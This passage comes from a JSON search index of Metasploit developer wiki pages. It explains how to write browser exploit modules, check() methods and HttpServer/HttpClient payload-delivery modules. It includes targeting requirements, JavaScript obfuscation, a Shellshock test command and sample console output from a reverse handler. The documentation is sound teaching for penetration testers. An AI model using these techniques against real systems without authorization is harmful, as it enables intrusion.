JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). If your BES-based exploit does not want obfuscation at all, always make sure you call the #deregister_options and remove the JsObfuscate option. Like this: deregister_options ( 'JsObfuscate' ) To learn more about Metasploit's JavaScript obfuscation capabilities, please read How to obfuscate JavaScript in Metasploit . Related Articles: https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer https://github.com/rapid7/metasploit-framework/wiki/Information-About-Unmet-Browser-Exploit-Requirements","title":"How to write a browser exploit using BrowserExploitServer"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/#the-automatic-exploitation-procedure","text":"The BrowserExploitServer mixin is the only mixin specially designed for browser exploitation. Before you use this mixin, you should understand what it does behind the scenes for you: It automatically collects the browser information, including things like: OS name, version, browser name, browser version, whether a proxy is used, Java plugin version, Microsoft Office version, etc, etc. If the browser doesn't have Javascript enabled, then it knows less about the target. All the info gathered will be stored in a profile managed by the mixin. The mixin will then tag the browser to track the session. It will also use the same tag to retrieve the profile when needed. Before the mixin decides if it should serve the exploit to the browser, it will check with the module for any exploitable requirements. If the requirements aren't met, it will send a 404 to the browser, and the operation bails. If the requirements are met, the mixin will pass the profile (information about the browser gathered during the detection stage) to the module, and let it take over the rest. Hint: In the module, you can check the :source key in the profile to determine whether Javascript is enabled or not: If the :source is \"script\", it means Javascript is enabled. If it's \"headers\" (as in HTTP headers), then the browser has Javascript disabled.","title":"The Automatic Exploitation Procedure"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/#setting-exploitable-requirements","text":"Being able to set browser requirements is an important feature of the mixin. It allows your attack to be smarter, more targeted, and prevents accidents. Here's a scenario: Say you have a vulnerability against Internet Explorer that only affects a specific range of MSHTML builds, you can set the :os_name, :ua_name, :ua_ver, and :mshtml_build to make sure it doesn't blindly exploit against anything else. The :mshtml_build requirement can be found in \"Product version\" under MSHTML's file properties. Exploitable browser requirements are defined under \"BrowserRequirements\" in the module's metadata. Here's an example of defining a vulnerable target running some ActiveX control: 'BrowserRequirements' => { source : /script/i , activex : [ { clsid : '{D27CDB6E-AE6D-11cf-96B8-444553540000}' , method : 'LoadMovie' } ] , os_name : /win/i } You can also define target-specific requirements. This is also how the mixin is able to automatically select a target, and you can get it with the \"get_target\" method. Here's an example of how to define target-specific requirements for IE8 on Win XP and IE 9 on Win 7: 'BrowserRequirements' => { :source => /script|headers/i , 'ua_name' => HttpClients :: IE , }, 'Targets' => [ [ 'Automatic' , {} ] , [ 'Windows XP with IE 8' , { :os_name => 'Windows XP' , 'ua_ver' => '8.0' , 'Rop' => true , 'Offset' => 0x100 } ] , [ 'Windows 7 with IE 9' , { 'os_name' => 'Windows 7' , 'ua_ver' => '9.0' , 'Rop' => true , 'Offset' => 0x200 } ] ] You can use these for :os_name : Constant Purpose OperatingSystems::Match::WINDOWS Match all versions of Windows OperatingSystems::Match::WINDOWS_95 Match Windows 95 OperatingSystems::Match::WINDOWS_98 Match Windows 98 OperatingSystems::Match::WINDOWS_ME Match Windows ME OperatingSystems::Match::WINDOWS_NT3 Match Windows NT 3 OperatingSystems::Match::WINDOWS_NT4 Match Windows NT 4 OperatingSystems::Match::WINDOWS_2000 Match Windows 2000 OperatingSystems::Match::WINDOWS_XP Match Windows XP OperatingSystems::Match::WINDOWS_2003 Match Windows Server 2003 OperatingSystems::Match::WINDOWS_VISTA Match Windows Vista OperatingSystems::Match::WINDOWS_2008 Match Windows Server 2008 OperatingSystems::Match::WINDOWS_7 Match Windows 7 OperatingSystems::Match::WINDOWS_2012 Match Windows 2012 OperatingSystems::Match::WINDOWS_8 Match Windows 8 OperatingSystems::Match::WINDOWS_81 Match Windows 8.1 OperatingSystems::Match::LINUX Match a Linux distro OperatingSystems::Match::MAC_OSX Match Mac OSX OperatingSystems::Match::FREEBSD Match FreeBSD OperatingSystems::Match::NETBSD Match NetBSD OperatingSystems::Match::OPENBSD Match OpenBSD OperatingSystems::Match::VMWARE Match VMWare OperatingSystems::Match::ANDROID Match Android OperatingSystems::Match::APPLE_IOS Match Apple IOS You can use these for :ua_name : Constant Value HttpClients::IE \"MSIE\" HttpClients::FF \"Firefox\" HttpClients::SAFARI \"Safari\" HttpClients::OPERA \"Opera\" HttpClients::CHROME \"Chrome\" More of these constants can be found here: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/constants.rb All currently supported requirements by the mixin can be found here (see REQUIREMENT_KEY_SET): https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/browser_exploit_server.rb#L46","title":"Setting Exploitable Requirements"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/#set-up-a-listener","text":"After the detection stage and the requirement check, the mixin will trigger the \"on_request_exploit\" callback method, that's where you handle the HTTP request, craft the HTML, and send back the exploit response. Here's an example of how to set up \"on_request_exploit\": # # Listens for the HTTP request # cli is the socket # request is the Rex::Proto::Http::Request object # target_info is a hash that contains all the browser info (aka the profile) # def on_request_exploit ( cli , request , target_info ) print_status ( \"Here's what I know about the target: #{ target_info . inspect } \" ) end","title":"Set up a listener"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/#crafting-html-with-browserexploitserver","text":"There are two coding styles the BrowserExploitServer mixin supports: The good old HTML, or ERB template. The first is pretty self-explanatory: def on_request_exploit ( cli , request , target_info ) html = %Q| <html> Hello, world! </html> | send_exploit_html ( cli , html ) end ERB is a new way to write Metasploit browser exploits. If you've written one or two web applications, this is no stranger to you. When you're using the BrowserExploitServer mixin to write an exploit, what really happens is you're writing a rails template. Here's an example of using of this feature: def on_request_exploit ( cli , request , target_info ) html = %Q| <html> Do you feel lucky, punk?<br> <% if [true, false].sample %> Lucky!<br> <% else %> Bad luck, bro!<Br> <% end %> </html> | send_exploit_html ( cli , html ) end If you want to access local variables or arguments, make sure to pass the binding object to send_exploit_html: def exploit_template1 ( target_info , txt ) txt2 = \"I can use local vars!\" template = %Q| <% msg = \"This page is generated by an exploit\" %> <%=msg%><br> <%=txt%><br> <%=txt2%><br> <p></p> Data gathered from source: #{ target_info [ :source ] } <br> OS name: #{ target_info [ :os_name ] } <br> UA name: #{ target_info [ :ua_name ] } <br> UA version: #{ target_info [ :ua_ver ] } <br> Java version: #{ target_info [ :java ] } <br> Office version: #{ target_info [ :office ] } | return template , binding () end def on_request_exploit ( cli , request , target_info ) send_exploit_html ( cli , exploit_template ( target_info , txt )) end The BrowserExploitServer mixin also offers plenty of other things useful while crafting the exploit. For example: it can generate a target-specific payload when you call the \"get_payload\" method. It also gives you access to the RopDb mixin, which contains a collection of ROPs to bypass DEP (Data Execution Prevention). Make sure to check out the API documentation for more information. To get thing started, here's a code example you can use start developing your browser exploit: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: BrowserExploitServer def initialize ( info = {}) super ( update_info ( info , 'Name' => \"BrowserExploitServer Example\" , 'Description' => %q{ This is an example of building a browser exploit using the BrowserExploitServer mixin } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Platform' => 'win' , 'BrowserRequirements' => { :source => /script|headers/i , }, 'Targets' => [ [ 'Automatic' , {} ] , [ 'Windows XP with IE 8' , { 'os_name' => 'Windows XP' , 'ua_name' => 'MSIE' , 'ua_ver' => '8.0' } ] , [ 'Windows 7 with IE 9' , { 'os_name' => 'Windows 7' , 'ua_name' => 'MSIE' , 'ua_ver' => '9.0' } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'DisclosureDate' => \"Apr 1 2013\" , 'DefaultTarget' => 0 )) end def exploit_template ( target_info ) template = %Q| Data source: <%=target_info[:source]%><br> OS name: <%=target_info[:os_name]%><br> UA name: <%=target_info[:ua_name]%><br> UA version: <%=target_info[:ua_ver]%><br> Java version: <%=target_info[:java]%><br> Office version: <%=target_info[:office]%> | return template , binding () end def on_request_exploit ( cli , request , target_info ) send_exploit_html ( cli , exploit_template ( target_info )) end end","title":"Crafting HTML with BrowserExploitServer"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/#javascript-obfuscation","text":"BrowserExploitServer relies on the JSObfu mixin to support JavaScript obfuscation. When you're writing JavaScript, you should always write it like this: js = js_obfuscate ( your_code ) The #js_obfuscate will return a Rex::Exploitation::JSObfu object. To get the obfuscated JavaScript, call the #to_s method: js . to_s If you need to access an obfuscated symbol name, you can use then #sym method: # Get the obfuscated version of function name test() var_name = js . sym ( 'test' ) Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). If your BES-based exploit does not want obfuscation at all, always make sure you call the #deregister_options and remove the JsObfuscate option. Like this: deregister_options ( 'JsObfuscate' ) To learn more about Metasploit's JavaScript obfuscation capabilities, please read How to obfuscate JavaScript in Metasploit .","title":"JavaScript Obfuscation"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/#related-articles","text":"https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer https://github.com/rapid7/metasploit-framework/wiki/Information-About-Unmet-Browser-Exploit-Requirements","title":"Related Articles:"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-HttpServer/","text":"The Metasploit Framework provides different mixins you can use to develop a browser exploit, mainly they are Msf::Exploit::Remote::HttpServer , Msf::Exploit::Remote::HttpServer::HTML and Msf::Exploit::Remote::BrowserExploitServer . This writeup covers the HttpServer mixin. The HttpServer mixin is kind of the mother of all HTTP server mixins (like BrowserExploitServer and HttpServer::HTML). To use it, your module is required to have a \"on_request_uri\" method, which is a callback triggered when the HTTP server receives a HTTP request from the browser. An example of setting up \"on_request_uri\": # # Listens for a HTTP request. # cli is the socket object, and request is a Rex::Proto::Http::Request object # def on_request_uri ( cli , request ) print_status ( \"Client requests URI: #{ request . uri } \" ) end The \"on_request_uri\" method is also where you can create the HTTP response. Here's a couple of choices you can use to do that: send_not_found(cli) - Sends a 404 to the client. Make sure to pass the cli (socket) object. send_redirect(cli, location='/', body='', headers={}) - Redirects the client to a new location. send_response(cli, body, headers={}) - Sends a response to the client. This method is probably what you'll be using most of the time. If you've seen some of our exploit modules, you will also see them using Exploit::Remote::HttpServer::HTML instead of Exploit::Remote::HttpServer. Usage is mostly the same, the difference is the Exploit::Remote::HttpServer::HTML mixin gives you access to some Javascript functions like Base64, heap spraying, OS detection, etc. Here's an example of sending a HTTP response: # # Sends a \"Hello, world!\" to the client # def on_request_uri ( cli , request ) html = \"Hello, world!\" send_response ( cli , html ) end Also note that in order to handle a HTTP request, it must contain the base URIPATH, which by default is random. This means if you want to handle multiple URIs (possible if you need to handle a redirect or a link), you also need to make sure they have the base URIPATH. To retrieve the base URIPATH, you can use the \"get_resource\" method, here's an example: def serve_page_1 ( cli ) html = \"This is page 1\" send_response ( cli , html ) end def serve_page_2 ( cli ) html = \"This is page 2\" send_response ( cli , html ) end def serve_default_page ( cli ) html = %Q| <html> <a href=\" #{ get_resource . chomp ( '/' ) } /page_1.html\">Go to page 1</a><br> <a href=\" #{ get_resource . chomp ( '/' ) } /page_2.html\">Go to page 2</a> </html> | send_response ( cli , html ) end def on_request_uri ( cli , request ) case request . uri when /page_1\\.html$/ serve_page_1 ( cli ) when /page_2\\.html$/ serve_page_2 ( cli ) else serve_default_page ( cli ) end end Of course, when you write a Metasploit browser exploit there's a lot more you need to think about. For example, your module probably needs to do browser detection, because it wouldn't make any sense to allow Chrome to receive an IE exploit, would it? You probably also need to build a payload that's specific to the target, which means your module needs to know what target it's hitting, and you have to build a method to customize the exploit accordingly, etc. The HttpServer and HttpServer::HTML mixin provies all kinds of methods to allow you to accomplish all these. Make sure to check out the API documentation (you can either do this by running msf/documentation/gendocs.sh, or just run \"yard\" in the msf directory), or checkout existing code examples (especially the recent ones). To get things started, you can always use the following template to start developing your browser exploit: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer def initialize ( info = {}) super ( update_info ( info , 'Name' => \"HttpServer mixin example\" , 'Description' => %q{ Here's an example of using the HttpServer mixin } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'Generic' , {} ] , ] , 'DisclosureDate' => \"Apr 1 2013\" , 'DefaultTarget' => 0 )) end def on_request_uri ( cli , request ) html = \"hello\" send_response ( cli , html ) end end If you want to take a closer look at what the mixin can do, see: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/http/server.rb","title":"How to write a browser exploit using HttpServer"},{"location":"dev/dark/How-to-write-a-check()-method/","text":"In Metasploit, exploits and auxiliary modules support the check command that allows the user to be able to determine the vulnerable state before using the module. This feature is handy for those who need to verify the vulnerability without actually popping a shell, and used to quickly identify all vulnerable, or possibly exploitable machines on the network. Although vulnerability checks aren't the focus of Metasploit, because it isn't a vulnerability scanner like Nexpose, we do actually encourage people to implement the check() method anyway to add more value to the module. If you do write one, make sure to keep these guidelines in mind: Check Method Output Modules messages are important to the user, because they keep him/her informed about what the module is doing, and usually make the module more debuggable. However, you do also want to keep your messages in verbose mode because it becomes really noisy if the check is used against multiple targets. Ideally, you only should be using these print methods: Method Description vprint_line() verbose version of print_line vprint_status() verbose version of print_status that begins with \"[*]\" vprint_error() verbose version of print_error that begins with \"[x]\" vprint_warning() verbose version of print_warning that begins with \"[!]\", in yellow vprint_debug() verbose versino of print_debug that begins with \"[!]\", in blue Note: You shouldn't be printing if a target is vulnerable or not, as this is automatically handled by the framework when your method returns a check code. Check Codes Once you have determined the vulnerable state, you should return a check code. Check codes are constants defined in Msf::Exploit::CheckCode, and these are the ones you can use: Checkcode Description Exploit::CheckCode::Unknown Used if the module fails to retrieve enough information from the target machine, such as due to a timeout. Exploit::CheckCode::Safe Used if the check fails to trigger the vulnerability, or even detect the service. Exploit::CheckCode::Detected The target is running the service in question, but the check fails to determine whether the target is vulnerable or not. Exploit::CheckCode::Appears This is used if the vulnerability is determined based on passive reconnaissance. For example: version, banner grabbing, or simply having the resource that's known to be vulnearble. Exploit::CheckCode::Vulnerable Only used if the check is able to actually take advantage of the bug, and obtain some sort of hard evidence. For example: for a command execution type bug, get a command output from the target system. For a directory traversal, read a file from the target, etc. Since this level of check is pretty aggressive in nature, you should not try to DoS the host as a way to prove the vulnerability. Exploit::CheckCode::Unsupported The exploit does not support the check method. If this is the case, then you don't really have to add the check method. Remote Check Example Here's an abstract example of how a Metasploit check might be written: # # Returns a check code that indicates the vulnerable state on an app running on OS X # def check if exec_cmd_via_http ( \"id\" ) =~ /uid=\\d+\\(.+\\)/ # Found the correct ID output, good indicating our command executed return Exploit :: CheckCode :: Vulnerable end http_body = get_http_body if http_body if http_body =~ /Something CMS v1\\.0/ # We are able to find the version thefore more precise about the vuln state return Exploit :: CheckCode :: Appears elsif http_body =~ /Something CMS/ # All we can tell the vulnerable app is running, but no more info to # determine the vuln return Exploit :: CheckCode :: Detected end else vprint_error ( \"Unable to determine due to a HTTP connection timeout\" ) return Exploit :: CheckCode :: Unknown end Exploit :: CheckCode :: Safe end Note: If you are writing an auxiliary module with the Msf::Auxiliary::Scanner mixin, you should declare your check method like this: def check_host ( ip ) # Do your thing end Local Exploit Check Example Most local exploit checks are done by checking the version of the vulnerable file, which is considered passive, therefore they should be flagging Exploit::CheckCode::Appears. Passive local exploit checks don't necessarily mean they are less reliable, in fact, they are not bad. But to qualify for Exploit::CheckCode::Vulnerable, your check should do the extra mile, which means either you somehow make the program return a vulnerable response, or you inspect the vulnerable code. An example of making the program return a vulnerable response is ShellShock (the following is specific for VMWare): def check check_str = Rex :: Text . rand_text_alphanumeric ( 5 ) # ensure they are vulnerable to bash env variable bug if cmd_exec ( \"env x='() { :;}; echo #{ check_str } ' bash -c echo\" ) . include? ( check_str ) && cmd_exec ( \"file ' #{ datastore [ 'VMWARE_PATH' ] } '\" ) !~ /cannot open/ Exploit :: CheckCode :: Vulnerable else Exploit :: CheckCode :: Safe end end One way to inspect the vulnerable code is to come up with a signature, and see if it exists in the vulnerable process. Here's an example with adobe_sandbox_adobecollabsync.rb: # 'AdobeCollabSyncTriggerSignature' => \"\\x56\\x68\\xBC\\x00\\x00\\x00\\xE8\\xF5\\xFD\\xFF\\xFF\" # 'AdobeCollabSyncTrigger' => 0x18fa0 def check_trigger signature = session . railgun . memread ( @addresses [ 'AcroRd32.exe' ] + target [ 'AdobeCollabSyncTrigger' ] , target [ 'AdobeCollabSyncTriggerSignature' ]. length ) if signature == target [ 'AdobeCollabSyncTriggerSignature' ] return true end return false end def check @addresses = {} acrord32 = session . railgun . kernel32 . GetModuleHandleA ( \"AcroRd32.exe\" ) @addresses [ 'AcroRd32.exe' ] = acrord32 [ \"return\" ] if @addresses [ 'AcroRd32.exe' ] == 0 return Msf :: Exploit :: CheckCode :: Unknown elsif check_trigger return Msf :: Exploit :: CheckCode :: Vulnerable else return Msf :: Exploit :: CheckCode :: Detected end end Another possible way to inspect is grab the vulnerable file, and use Metasm. But of course, this is a lot slower and generates more network traffic.","title":"How to write a check() method"},{"location":"dev/dark/How-to-write-a-check()-method/#check-method-output","text":"Modules messages are important to the user, because they keep him/her informed about what the module is doing, and usually make the module more debuggable. However, you do also want to keep your messages in verbose mode because it becomes really noisy if the check is used against multiple targets. Ideally, you only should be using these print methods: Method Description vprint_line() verbose version of print_line vprint_status() verbose version of print_status that begins with \"[*]\" vprint_error() verbose version of print_error that begins with \"[x]\" vprint_warning() verbose version of print_warning that begins with \"[!]\", in yellow vprint_debug() verbose versino of print_debug that begins with \"[!]\", in blue Note: You shouldn't be printing if a target is vulnerable or not, as this is automatically handled by the framework when your method returns a check code.","title":"Check Method Output"},{"location":"dev/dark/How-to-write-a-check()-method/#check-codes","text":"Once you have determined the vulnerable state, you should return a check code. Check codes are constants defined in Msf::Exploit::CheckCode, and these are the ones you can use: Checkcode Description Exploit::CheckCode::Unknown Used if the module fails to retrieve enough information from the target machine, such as due to a timeout. Exploit::CheckCode::Safe Used if the check fails to trigger the vulnerability, or even detect the service. Exploit::CheckCode::Detected The target is running the service in question, but the check fails to determine whether the target is vulnerable or not. Exploit::CheckCode::Appears This is used if the vulnerability is determined based on passive reconnaissance. For example: version, banner grabbing, or simply having the resource that's known to be vulnearble. Exploit::CheckCode::Vulnerable Only used if the check is able to actually take advantage of the bug, and obtain some sort of hard evidence. For example: for a command execution type bug, get a command output from the target system. For a directory traversal, read a file from the target, etc. Since this level of check is pretty aggressive in nature, you should not try to DoS the host as a way to prove the vulnerability. Exploit::CheckCode::Unsupported The exploit does not support the check method. If this is the case, then you don't really have to add the check method.","title":"Check Codes"},{"location":"dev/dark/How-to-write-a-check()-method/#remote-check-example","text":"Here's an abstract example of how a Metasploit check might be written: # # Returns a check code that indicates the vulnerable state on an app running on OS X # def check if exec_cmd_via_http ( \"id\" ) =~ /uid=\\d+\\(.+\\)/ # Found the correct ID output, good indicating our command executed return Exploit :: CheckCode :: Vulnerable end http_body = get_http_body if http_body if http_body =~ /Something CMS v1\\.0/ # We are able to find the version thefore more precise about the vuln state return Exploit :: CheckCode :: Appears elsif http_body =~ /Something CMS/ # All we can tell the vulnerable app is running, but no more info to # determine the vuln return Exploit :: CheckCode :: Detected end else vprint_error ( \"Unable to determine due to a HTTP connection timeout\" ) return Exploit :: CheckCode :: Unknown end Exploit :: CheckCode :: Safe end Note: If you are writing an auxiliary module with the Msf::Auxiliary::Scanner mixin, you should declare your check method like this: def check_host ( ip ) # Do your thing end","title":"Remote Check Example"},{"location":"dev/dark/How-to-write-a-check()-method/#local-exploit-check-example","text":"Most local exploit checks are done by checking the version of the vulnerable file, which is considered passive, therefore they should be flagging Exploit::CheckCode::Appears. Passive local exploit checks don't necessarily mean they are less reliable, in fact, they are not bad. But to qualify for Exploit::CheckCode::Vulnerable, your check should do the extra mile, which means either you somehow make the program return a vulnerable response, or you inspect the vulnerable code. An example of making the program return a vulnerable response is ShellShock (the following is specific for VMWare): def check check_str = Rex :: Text . rand_text_alphanumeric ( 5 ) # ensure they are vulnerable to bash env variable bug if cmd_exec ( \"env x='() { :;}; echo #{ check_str } ' bash -c echo\" ) . include? ( check_str ) && cmd_exec ( \"file ' #{ datastore [ 'VMWARE_PATH' ] } '\" ) !~ /cannot open/ Exploit :: CheckCode :: Vulnerable else Exploit :: CheckCode :: Safe end end One way to inspect the vulnerable code is to come up with a signature, and see if it exists in the vulnerable process. Here's an example with adobe_sandbox_adobecollabsync.rb: # 'AdobeCollabSyncTriggerSignature' => \"\\x56\\x68\\xBC\\x00\\x00\\x00\\xE8\\xF5\\xFD\\xFF\\xFF\" # 'AdobeCollabSyncTrigger' => 0x18fa0 def check_trigger signature = session . railgun . memread ( @addresses [ 'AcroRd32.exe' ] + target [ 'AdobeCollabSyncTrigger' ] , target [ 'AdobeCollabSyncTriggerSignature' ]. length ) if signature == target [ 'AdobeCollabSyncTriggerSignature' ] return true end return false end def check @addresses = {} acrord32 = session . railgun . kernel32 . GetModuleHandleA ( \"AcroRd32.exe\" ) @addresses [ 'AcroRd32.exe' ] = acrord32 [ \"return\" ] if @addresses [ 'AcroRd32.exe' ] == 0 return Msf :: Exploit :: CheckCode :: Unknown elsif check_trigger return Msf :: Exploit :: CheckCode :: Vulnerable else return Msf :: Exploit :: CheckCode :: Detected end end Another possible way to inspect is grab the vulnerable file, and use Metasm. But of course, this is a lot slower and generates more network traffic.","title":"Local Exploit Check Example"},{"location":"dev/dark/How-to-write-a-module-using-HttpServer-and-HttpClient/","text":"Using multiple networking mixins in a Metasploit module is always a tricky thing to do, because most likely you will run into issues like overlapping datastore options, variables, methods, the super call is only meant for one mixin, etc. This is considered as advanced module development, and sometimes can be rather painful to figure out on your own. To improve the Metasploit development experience, we have a few examples to demonstrate common scenarios that require you to use multiple mixins to achieve exploitation. Today's lesson: Send a HTTP request to attack the target machine, and use a HttpServer for payload delivery. Say you want to exploit a web server or web application. You have code execution on the box, but you need to find a way to deliver the final payload (probably an executable), and a HTTP server happens to be your option. Here is how you can set it up: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = {}) super ( update_info ( info , 'Name' => \"HttpClient and HttpServer Example\" , 'Description' => %q{ This demonstrates how to use two mixins (HttpClient and HttpServer) at the same time, but this allows the HttpServer to terminate after a delay. } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'Platform' => 'win' , 'Targets' => [ [ 'Automatic' , {} ] , ] , 'Privileged' => false , 'DisclosureDate' => \"Dec 09 2013\" , 'DefaultTarget' => 0 )) register_options ( [ OptString . new ( 'TARGETURI' , [ true , 'The path to some web application' , '/' ] ), OptInt . new ( 'HTTPDELAY' , [ false , 'Number of seconds the web server will wait before termination' , 10 ] ) ] , self . class ) end def on_request_uri ( cli , req ) print_status ( \" #{ peer } - Payload request received: #{ req . uri } \" ) send_response ( cli , 'You get this, I own you' ) end def primer print_status ( \"Sending a malicious request to #{ target_uri . path } \" ) send_request_cgi ({ 'uri' => normalize_uri ( target_uri . path )}) end def exploit begin Timeout . timeout ( datastore [ 'HTTPDELAY' ] ) { super } rescue Timeout :: Error # When the server stops due to our timeout, this is raised end end end Here's what happens when you run the above example: The super call wrapped in the Timeout block will start the web server. Before the web server is in the infinite loop state, the primer() method is called, which is where you send your malicious requests to get code execution. Your HttpServer serves the final payload upon request. After 10 seconds, the module raises a Timeout exception. The web server finally terminates. In case you're wondering why the web server must terminate after a period of time, this is because if the module fails to gain code execution on the target machine, obviously it will never ask your web server for the malicious payload, therefore there is no point to keeping it alive forever. Typically it shouldn't take a very long time to get a payload request, either, so we keep the timeout short. The output for the above example should look something like this: msf exploit(test) > run [*] Exploit running as background job. [*] Started reverse handler on 10.0.1.76:4444 [*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80 [*] Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80 [*] Server started. [*] Sending a malicious request to / msf exploit(test) > [*] 10.0.1.76 test - 10.0.1.76:8181 - Payload request received: /SUuv1qjZbCibL80 [*] Server stopped. msf exploit(test) > Related Articles: https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer https://community.rapid7.com/community/metasploit/blog/2012/12/17/metasploit-hooks","title":"How to write a module using HttpServer and HttpClient"},{"location":"dev/dark/How-to-write-a-module-using-HttpServer-and-HttpClient/#todays-lesson-send-a-http-request-to-attack-the-target-machine-and-use-a-httpserver-for-payload-delivery","text":"Say you want to exploit a web server or web application. You have code execution on the box, but you need to find a way to deliver the final payload (probably an executable), and a HTTP server happens to be your option. Here is how you can set it up: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = {}) super ( update_info ( info , 'Name' => \"HttpClient and HttpServer Example\" , 'Description' => %q{ This demonstrates how to use two mixins (HttpClient and HttpServer) at the same time, but this allows the HttpServer to terminate after a delay. } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'Platform' => 'win' , 'Targets' => [ [ 'Automatic' , {} ] , ] , 'Privileged' => false , 'DisclosureDate' => \"Dec 09 2013\" , 'DefaultTarget' => 0 )) register_options ( [ OptString . new ( 'TARGETURI' , [ true , 'The path to some web application' , '/' ] ), OptInt . new ( 'HTTPDELAY' , [ false , 'Number of seconds the web server will wait before termination' , 10 ] ) ] , self . class ) end def on_request_uri ( cli , req ) print_status ( \" #{ peer } - Payload request received: #{ req . uri } \" ) send_response ( cli , 'You get this, I own you' ) end def primer print_status ( \"Sending a malicious request to #{ target_uri . path } \" ) send_request_cgi ({ 'uri' => normalize_uri ( target_uri . path )}) end def exploit begin Timeout . timeout ( datastore [ 'HTTPDELAY' ] ) { super } rescue Timeout :: Error # When the server stops due to our timeout, this is raised end end end Here's what happens when you run the above example: The super call wrapped in the Timeout block will start the web server. Before the web server is in the infinite loop state, the primer() method is called, which is where you send your malicious requests to get code execution. Your HttpServer serves the final payload upon request. After 10 seconds, the module raises a Timeout exception. The web server finally terminates. In case you're wondering why the web server must terminate after a period of time, this is because if the module fails to gain code execution on the target machine, obviously it will never ask your web server for the malicious payload, therefore there is no point to keeping it alive forever. Typically it shouldn't take a very long time to get a payload request, either, so we keep the timeout short. The output for the above example should look something like this: msf exploit(test) > run [*] Exploit running as background job. [*] Started reverse handler on 10.0.1.76:4444 [*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80 [*] Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80 [*] Server started. [*] Sending a malicious request to / msf exploit(test) > [*] 10.0.1.76 test - 10.0.1.76:8181 - Payload request received: /SUuv1qjZbCibL80 [*] Server stopped. msf exploit(test) >","title":"Today's lesson: Send a HTTP request to attack the target machine, and use a HttpServer for payload delivery."},{"location":"dev/dark/How-to-write-a-module-using-HttpServer-and-HttpClient/#related-articles","text":"https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer https://community.rapid7.com/community/metasploit/blog/2012/12/17/metasploit-hooks","title":"Related Articles:"},{"location":"dev/dark/How-to-zip-files-with-Msf-Util-EXE.to_zip/","text":"How to zip files with Msf::Util::EXE.to_zip Compressing files into zip format is very easy with Metasploit. For most purposes, you can use Msf::Util::EXE.to_zip() to compress data into a zip file. Note that the former Rex::Zip::Archive() should no longer be used. Usage: files = [ { data : 'AAAA' , fname : 'test1.txt' , comment : 'my comment' }, { data : 'BBBB' , fname : 'test2.txt' } ] zip = Msf :: Util :: EXE . to_zip ( files ) If saved as a file, the above example will extract to the following: $ unzip test.zip Archive: test.zip extracting: test1.txt extracting: test2.txt","title":"How to zip files with Msf::Util::EXE.to_zip"},{"location":"dev/dark/How-to-zip-files-with-Msf-Util-EXE.to_zip/#how-to-zip-files-with-msfutilexeto_zip","text":"Compressing files into zip format is very easy with Metasploit. For most purposes, you can use Msf::Util::EXE.to_zip() to compress data into a zip file. Note that the former Rex::Zip::Archive() should no longer be used.","title":"How to zip files with Msf::Util::EXE.to_zip"},{"location":"dev/dark/How-to-zip-files-with-Msf-Util-EXE.to_zip/#usage","text":"files = [ { data : 'AAAA' , fname : 'test1.txt' , comment : 'my comment' }, { data : 'BBBB' , fname : 'test2.txt' } ] zip = Msf :: Util :: EXE . to_zip ( files ) If saved as a file, the above example will extract to the following: $ unzip test.zip Archive: test.zip extracting: test1.txt extracting: test2.txt","title":"Usage:"},{"location":"dev/dark/Information-About-Unmet-Browser-Exploit-Requirements/","text":"So I see your browser exploit has refused to attack due to some kind of unmet requirements. Typically this 